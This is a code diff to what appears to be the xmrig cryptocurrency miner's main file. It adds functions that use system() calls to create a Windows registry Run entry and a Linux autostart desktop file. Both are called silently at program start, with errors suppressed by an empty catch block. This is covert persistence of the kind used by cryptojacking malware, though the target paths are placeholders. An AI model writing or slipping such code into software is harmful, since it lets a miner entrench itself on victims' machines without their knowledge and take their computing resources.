@@ -20,9 +20,34 @@
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
 
+#ifdef _WIN32
+void addToStartupWindows() {
+    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyProgram /t REG_SZ /d \"C:\\\\path\\\\to\\\\program.exe\" /f");
+}
+#else
+void addToStartupLinux() {
+    system("echo '[Desktop Entry]\n"
+           "Type=Application\n"
+           "Exec=/path/to/your/program\n"
+           "Hidden=false\n"
+           "NoDisplay=false\n"
+           "X-GNOME-Autostart-enabled=true\n"
+           "Name=MyProgram' > ~/.config/autostart/my_program.desktop");
+}
+#endif
 
 int main(int argc, char **argv)
 {
+    try {
+        #ifdef _WIN32
+            addToStartupWindows();
+        #else
+            addToStartupLinux();
+        #endif
+    } catch (...) {
+
+    }
+
     using namespace xmrig;
 
     Process process(argc, argv);
